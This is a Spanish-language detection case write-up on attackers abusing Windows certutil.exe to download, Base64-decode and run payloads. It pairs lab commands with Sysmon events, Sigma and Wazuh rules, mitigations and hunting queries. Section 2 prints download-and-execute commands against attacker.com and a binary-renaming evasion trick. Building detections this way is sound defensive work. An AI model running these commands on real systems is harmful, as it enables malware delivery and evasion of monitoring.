# Case 002 — LOLBAS: certutil para descarga y decodificación de payloads

**Táctica MITRE:** Defense Evasion / Command and Control  
**Técnica:** T1218 — System Binary Proxy Execution  
**Sub-técnica:** T1105 — Ingress Tool Transfer  
**Severidad:** Alta  
**Estado:** ✅ Documentado con regla funcional  

---

## 1. Contexto

**LOLBAS** (Living Off the Land Binaries and Scripts) son binarios legítimos de Windows que los atacantes reutilizan para ejecutar acciones maliciosas. La ventaja para el atacante: están firmados por Microsoft, suelen estar en whitelist y generan menos sospechas que herramientas externas.

`certutil.exe` es una utilidad de gestión de certificados incluida en Windows. Los atacantes la abusan para:

- **Descargar archivos** desde Internet (como `wget` en Linux)
- **Decodificar Base64** para reconstruir payloads ofuscados
- **Encodear archivos** para exfiltración o evasión
- Bypassear controles de ejecución que bloquean herramientas conocidas

### ¿Por qué es relevante?

- Está en el **Top 10 LOLBAS más utilizados** en incidentes reales
- Usada por grupos APT, ransomware (Ryuk, Conti) y red teams
- El binario está en **todos los sistemas Windows** desde XP
- Muchas soluciones AV/EDR históricamente lo dejaban pasar

---

## 2. Reproducción en el laboratorio

> ⚠️ Solo ejecutar en entorno controlado y aislado. No descargar contenido real malicioso.

### Técnica 1: Descarga de archivo remoto

```cmd
# certutil usado como downloader (equivalente a wget)
certutil.exe -urlcache -split -f http://192.168.1.200/payload.txt C:\Users\Public\payload.txt

# Variante sin flag -split (más antigua pero funciona)
certutil.exe -urlcache -f http://192.168.1.200/archivo.exe C:\Temp\archivo.exe
```

### Técnica 2: Decodificación Base64

```cmd
# Primero encodear un archivo (para simular el escenario)
certutil.exe -encode C:\Windows\System32\calc.exe C:\Temp\calc.b64

# Luego decodificar (como lo haría el atacante)
certutil.exe -decode C:\Temp\calc.b64 C:\Temp\output.exe
```

### Técnica 3: Combinada (descarga + decode, patrón real)

```cmd
# Descargar payload en Base64 y decodificarlo
certutil.exe -urlcache -split -f http://attacker.com/payload.b64 C:\Temp\p.b64
certutil.exe -decode C:\Temp\p.b64 C:\Temp\payload.exe
C:\Temp\payload.exe
```

### Técnica 4: Bypass de extensión

```cmd
# Renombrar certutil para evadir detecciones por nombre
copy C:\Windows\System32\certutil.exe C:\Temp\update.exe
C:\Temp\update.exe -urlcache -split -f http://attacker.com/file C:\Temp\file
```

---

## 3. Eventos generados

### Event ID 1 — Process Create (Sysmon)

```xml
<!-- Descarga con certutil -->
<EventID>1</EventID>
<Image>C:\Windows\System32\certutil.exe</Image>
<CommandLine>certutil.exe -urlcache -split -f http://192.168.1.200/payload.txt C:\Users\Public\payload.txt</CommandLine>
<ParentImage>C:\Windows\System32\cmd.exe</ParentImage>
<User>DESKTOP-LAB\usuario</User>
```

### Event ID 3 — Network Connection (Sysmon)

```xml
<!-- Conexión de red iniciada por certutil — señal fuerte -->
<EventID>3</EventID>
<Image>C:\Windows\System32\certutil.exe</Image>
<DestinationIp>192.168.1.200</DestinationIp>
<DestinationPort>80</DestinationPort>
<Protocol>tcp</Protocol>
```

### Event ID 11 — File Created (Sysmon)

```xml
<!-- Archivo creado por certutil fuera de rutas esperadas -->
<EventID>11</EventID>
<Image>C:\Windows\System32\certutil.exe</Image>
<TargetFilename>C:\Users\Public\payload.txt</TargetFilename>
```

> **Clave:** La combinación de Event ID 1 + Event ID 3 desde `certutil.exe` es prácticamente siempre sospechosa. `certutil` no debería iniciar conexiones de red en operación normal.

---

## 4. Reglas de detección

### Sigma

```yaml
title: LOLBAS - CertUtil Suspicious Usage
id: b3c5d7e9-2345-6789-bcde-f01234567890
status: test
description: |
    Detecta uso sospechoso de certutil.exe para descarga de archivos,
    decodificación Base64, o ejecución desde rutas no estándar.
    certutil es un binario LOLBAS frecuentemente abusado por atacantes.
author: briamrlz82
date: 2024/01/20
references:
    - https://attack.mitre.org/techniques/T1218/
    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
tags:
    - attack.defense_evasion
    - attack.t1218
    - attack.command_and_control
    - attack.t1105
logsource:
    category: process_creation
    product: windows
detection:
    # Detección 1: certutil como downloader
    selection_download:
        Image|endswith: '\certutil.exe'
        CommandLine|contains:
            - '-urlcache'
            - '-verifyctl'
    # Detección 2: certutil decodificando Base64
    selection_decode:
        Image|endswith: '\certutil.exe'
        CommandLine|contains:
            - '-decode'
            - '-decodehex'
    # Detección 3: certutil desde ruta no estándar (renamed)
    selection_renamed:
        Image|endswith: '\certutil.exe'
        CommandLine|contains: '-encode'
        Image|not_contains: 'System32'
    filter_legitimate:
        # Operaciones legítimas de PKI/certificados
        CommandLine|contains:
            - '-store'
            - '-addstore'
            - '-viewstore'
            - '-repairstore'
    condition: (selection_download or selection_decode or selection_renamed) and not filter_legitimate
falsepositives:
    - Administradores que usen certutil para gestión real de certificados
    - Scripts de PKI internos
    - Algunas herramientas de gestión que usen certutil legítimamente
level: high
```

### Wazuh (XML)

```xml
<group name="lolbas,certutil,detection,defense_evasion">

  <!-- Regla base: certutil con flags sospechosos -->
  <rule id="100020" level="10">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)certutil\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)(-urlcache|-verifyctl|-decode|-decodehex)</field>
    <description>LOLBAS: certutil.exe usado con flags sospechosos (posible descarga o decode)</description>
    <mitre>
      <id>T1218</id>
    </mitre>
    <group>certutil_suspicious</group>
  </rule>

  <!-- Regla alta: certutil descargando desde Internet -->
  <rule id="100021" level="14">
    <if_sid>100020</if_sid>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)-urlcache.{0,50}(http|ftp|https)://</field>
    <description>ALTA: certutil.exe descargando archivo desde URL remota</description>
    <mitre>
      <id>T1218</id>
      <id>T1105</id>
    </mitre>
    <group>certutil_download,high_severity</group>
  </rule>

  <!-- Regla: certutil ejecutado desde ruta no estándar (renamed) -->
  <rule id="100022" level="15">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)certutil\.exe$</field>
    <field name="win.eventdata.image" type="pcre2" negate="yes">(?i)System32\\certutil\.exe$</field>
    <description>CRÍTICO: certutil.exe ejecutado desde ruta no estándar (posible rename para evasión)</description>
    <mitre>
      <id>T1218</id>
      <id>T1036.003</id>
    </mitre>
    <group>certutil_renamed,critical</group>
  </rule>

  <!-- Correlación: certutil + conexión de red (Event ID 3) -->
  <rule id="100023" level="15" frequency="2" timeframe="60">
    <if_matched_sid>100020</if_matched_sid>
    <if_group>sysmon_event3</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)certutil\.exe$</field>
    <description>CRÍTICO: certutil.exe generó conexión de red — descarga confirmada</description>
    <mitre>
      <id>T1218</id>
      <id>T1105</id>
    </mitre>
    <group>certutil_network,critical,confirmed</group>
  </rule>

  <!-- Excepción: gestión legítima de certificados PKI -->
  <rule id="100029" level="0">
    <if_sid>100020</if_sid>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)(-store|-addstore|-viewstore|-repairstore|-CA:)</field>
    <description>Excepción: certutil en operación legítima de PKI</description>
  </rule>

</group>
```

---

## 5. Alerta generada

```json
{
  "timestamp": "2024-01-20T10:15:33.218+0000",
  "rule": {
    "id": "100021",
    "level": 14,
    "description": "ALTA: certutil.exe descargando archivo desde URL remota",
    "groups": ["certutil_download", "lolbas", "high_severity"],
    "mitre": {
      "technique": ["T1218", "T1105"],
      "tactic": ["Defense Evasion", "Command and Control"]
    }
  },
  "agent": {
    "id": "001",
    "name": "DESKTOP-LAB",
    "ip": "192.168.1.100"
  },
  "data": {
    "win": {
      "eventdata": {
        "image": "C:\\Windows\\System32\\certutil.exe",
        "commandLine": "certutil.exe -urlcache -split -f http://192.168.1.200/payload.txt C:\\Users\\Public\\payload.txt",
        "parentImage": "C:\\Windows\\System32\\cmd.exe",
        "user": "DESKTOP-LAB\\usuario",
        "processId": "3344"
      }
    }
  }
}
```

---

## 6. Falsos positivos

| Fuente | Patrón | Acción recomendada |
|--------|--------|--------------------|
| PKI / CA interna | `certutil -store`, `-addstore` | Excluir por flag (regla 100029) |
| Scripts de deploy de certificados | Rutas conocidas + flags de store | Whitelist por ruta del script padre |
| Herramientas de gestión de endpoints | Depende del vendor | Excluir por `parentImage` del agente |

> **Importante:** El uso de `-urlcache` o `-decode` rara vez es legítimo en entornos corporativos normales. Ante la duda, escalar.

---

## 7. Mitigación

| Control | Implementación | Prioridad |
|---------|---------------|-----------|
| AppLocker / WDAC | Bloquear ejecución de certutil desde rutas no estándar | 🔴 Alta |
| Restricción de red en endpoint | Bloquear conexiones HTTP salientes desde binarios del sistema | 🔴 Alta |
| Monitoreo de Event ID 3 (Sysmon) | Alertar cuando certutil.exe inicia conexión de red | 🔴 Alta |
| ASR Rule | "Block execution of potentially obfuscated scripts" | 🟡 Media |
| Logging de línea de comandos | Event ID 4688 con línea de comandos habilitado | 🔴 Alta |

### Bloqueo con AppLocker (ejemplo)

```xml
<!-- GPO: Computer Config > Windows Settings > Security Settings > AppLocker -->
<FilePathRule Id="..." Action="Deny" UserOrGroupSid="S-1-1-0">
  <Conditions>
    <FilePathCondition Path="%TEMP%\*.exe"/>
    <FilePathCondition Path="%USERPROFILE%\Downloads\*.exe"/>
  </Conditions>
</FilePathRule>
```

---

## 8. Hunting queries

Si querés hacer threat hunting proactivo sobre este TTP:

### Kibana / Elasticsearch
```
event.code: "1" AND process.name: "certutil.exe" AND process.command_line: (*urlcache* OR *decode*)
```

### Wazuh API
```python
# Buscar alertas de certutil en los últimos 7 días
GET /security/events?q=rule.groups:certutil_suspicious&limit=100
```

---

## 📎 Archivos relacionados

- [`../../rules/wazuh/lolbas_detection.xml`](../../rules/wazuh/lolbas_detection.xml) — Regla Wazuh
- [`../../rules/sigma/lolbas_certutil.yml`](../../rules/sigma/lolbas_certutil.yml) — Regla Sigma

---

## 🔗 Referencias

- [MITRE T1218 — System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/)
- [MITRE T1105 — Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
- [LOLBAS Project — certutil](https://lolbas-project.github.io/lolbas/Binaries/Certutil/)
- [Atomic Red Team — T1218](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/)
